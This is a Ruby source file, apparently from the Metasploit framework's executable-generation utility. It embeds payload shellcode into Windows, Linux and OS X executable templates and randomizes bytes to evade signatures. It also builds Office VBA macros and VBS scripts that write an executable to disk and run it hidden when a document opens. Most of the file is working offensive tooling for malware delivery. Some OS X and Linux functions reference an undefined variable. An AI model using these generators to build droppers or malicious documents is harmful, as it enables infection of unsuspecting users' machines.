###
#
# framework-util-exe
# --------------
#
# The class provides methods for creating and encoding executable file 
# formats for various platforms. It is a replacement for the previous
# code in Rex::Text
#
###

module Msf
module Util
class EXE


	##
	#
	# Executable generators
	#
	##
	
	def self.to_executable(framework, arch, plat, code='')
		if (arch.index(ARCH_X86))

			if (plat.index(Msf::Module::Platform::Windows))
				return to_win32pe(framework, code)
			end

			if (plat.index(Msf::Module::Platform::Linux))
				return to_linux_x86_elf(framework, code)
			end
			
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_x86_macho(framework, code)		
			end	
			
			# XXX: Add remaining x86 systems here					
		end

		if(arch.index(ARCH_ARMLE))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_arm_macho(framework, code)		
			end
			# XXX: Add Linux here
		end

		if(arch.index(ARCH_PPC))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_ppc_macho(framework, code)	
			end
			# XXX: Add PPC OS X and Linux here			
		end						
		nil
	end

	
	def self.to_win32pe(framework, code)
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		if(code.length < 8192)
			code << Rex::Text.rand_text(8192-code.length)
		end
		
		bo = pe.index('PAYLOAD:')
		pe[bo,  8192] = code if bo
		pe[136,    4] = [rand(0x100000000)].pack('V')

		ci = pe.index("\x31\xc9" * 160)
		cd = pe.index("\x31\xc9" * 160, ci + 320)
		rc = pe[ci+320, cd-ci-320]
		
		# 640 + rc.length bytes of room to store an encoded rc at offset ci
		enc = encode_stub(framework, [ARCH_X86], rc)
		lft = 640+rc.length - enc.length

		buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
		pe[ci, buf.length] = buf
		
		# Make the data section executable
		xi = pe.index([0xc0300040].pack('V'))
		pe[xi,4] = [0xe0300020].pack('V')
		
		# Add a couple random bytes for fun
		pe << Rex::Text.rand_text(rand(4096)+128)

		return pe
	end
	
	def self.to_win32pe_service(framework, code, name='SERVICENAME')
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "service.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		bo = pe.index('PAYLOAD:')
		pe[bo, 8192] = [code].pack('a8192') if bo

		bo = pe.index('SERVICENAME')
		pe[bo, 11] = [name].pack('a11') if bo
		
		pe[136, 4] = [rand(0x100000000)].pack('V')

		return pe
	end
	
	def self.to_osx_arm_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_armle_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 8192] = [code].pack('a8192') if bo
		mo[co, 512]  = [note].pack('a512') if co

		return mo
	end

	def self.to_osx_ppc_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_ppc_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 8192] = [code].pack('a8192') if bo
		mo[co, 512]  = [note].pack('a512') if co

		return mo
	end
	
	def self.to_osx_x86_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 8192] = [code].pack('a8192') if bo
		mo[co, 512]  = [note].pack('a512') if co

		return mo
	end
		
	def self.to_linux_x86_elf(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_linux.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 8192] = [code].pack('a8192') if bo
		mo[co, 512]  = [note].pack('a512') if co

		return mo
	end

	def self.to_exe_vba(exe='')
		vba = ""
		pcs = (exe.length/2000)+1
		idx = 0
		
		var_base_idx = 0
		var_base     =  Rex::Text.rand_text_alpha(2).capitalize
		
		var_bytes = var_base + (var_base_idx+=1).to_s
		var_initx = var_base +  Rex::Text.rand_text_alpha(1) + (var_base_idx+=1).to_s
		
		vba << "Dim #{var_bytes}(#{exe.length}) as Byte\r\n\r\n"
		1.upto(pcs) do |pc|
			max = 0
			vba << "Sub #{var_initx}#{pc}()\r\n"
			
			while(c = exe[idx] and max < 2000)
				vba << "\t#{var_bytes}(#{idx}) = &H#{("%.2x" % c).upcase}\r\n"
				idx += 1
				max += 1
			end	
			vba << "End Sub\r\n"
		end
		
		var_lname = var_base + (var_base_idx+=1).to_s
		var_lpath = var_base + (var_base_idx+=1).to_s
		var_appnr = var_base + (var_base_idx+=1).to_s
		var_datnr = var_base + (var_base_idx+=1).to_s
		
		vba << "Sub Auto_Open()\r\n"
		vba << "\tDim #{var_appnr} As Integer\r\n"
		vba << "\tDim #{var_datnr} As Integer\r\n"
		vba << "\tDim #{var_lname} As String\r\n"
		vba << "\tDim #{var_lpath} As String\r\n"
		vba << "\t#{var_lname} = \"#{rand_text_alpha(rand(8)+8)}.exe\"\r\n"
		vba << "\t#{var_lpath} = Environ(\"USERPROFILE\")\r\n"
		vba << "\tChDrive (#{var_lpath})\r\n"
		vba << "\tChDir (#{var_lpath})\r\n"
		vba << "\t#{var_datnr} = FreeFile()\r\n"
		vba << "\tOpen #{var_lname}  For Binary Access Read Write As #{var_datnr}\r\n"
		
		1.upto(pcs) do |pc|
			vba << "\t#{var_initx}#{pc}\r\n"
		end
		
		vba << "\tPut #{var_datnr}, , #{var_bytes}\r\n"
		vba << "\tClose #{var_datnr}\r\n"
		vba << "\t#{var_appnr} = Shell(#{var_lname}, vbHide)\r\n"
		vba << "End Sub\r\n"
		
		vba << "Sub AutoOpen()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"
		
		vba << "Sub Workbook_Open()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"
				
	end

	def self.to_win32pe_vba(framework, code)
		to_exe_vba(to_win32pe(framework, code))
	end

	def self.to_exe_vbs(exe = '')
		vbs = ""

		var_bytes =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_fname =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_func =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_stream =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_obj =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_shell =  Rex::Text.rand_text_alpha(rand(8)+8)

		vbs << "Function #{var_func}()\r\n"

		vbs << "#{var_bytes} = Chr(&H#{("%02x" % exe[0])})"
		
		1.upto(exe.length) do |byte|
			vbs << "&Chr(&H#{("%02x" % exe[byte])})" 
		end	
		vbs << "\r\n"
		
		vbs << "Dim #{var_obj}\r\n"
		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
		vbs << "Dim #{var_stream}\r\n"
		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(\"#{var_fname}.exe\")\r\n"
		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
		vbs << "#{var_stream}.Close\r\n"
		vbs << "Dim #{var_shell}\r\n"
		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
		vbs << "#{var_shell}.run(\"#{var_fname}.exe\")\r\n"
		vbs << "End Function\r\n"
		vbs << "#{var_func}\r\n"
	end

	def self.to_win32pe_vbs(framework, code)
		to_exe_vbs(to_win32pe(framework, code))
	end

	# Creates a .NET DLL which loads data into memory
	# at a specified location with read/execute permissions
	#    - the data will be loaded at: base+0x2065
	#    - max size is 0x8000 (32768)
	def self.to_dotnetmem(base=0x12340000, data="")
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "dotnetmem.dll"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		# Configure the image base
		pe[180, 4] = [base].pack('V')
		
		# Configure the TimeDateStamp
		pe[136, 4] = [rand(0x100000000)].pack('V')

		# XXX: Unfortunately we cant make this RWX only RX
		# Mark this segment as read-execute AND writable
		# pe[412,4] = [0xe0000020].pack("V")
		
		# Write the data into the .text segment
		pe[0x1065, 0x8000] = [data].pack("a32768")
		
		# Generic a randomized UUID
		pe[37656,16] = Rex::Text.rand_text(16)
		
		return pe
	end
	
	
	def self.encode_stub(framework, arch, code)
		return code if not framework.encoders
		framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
			begin
				enc = framework.encoders.create(name)
				raw = enc.encode(code, '')
				return raw if raw
			rescue
			end
		end
		nil
	end


end
end
end
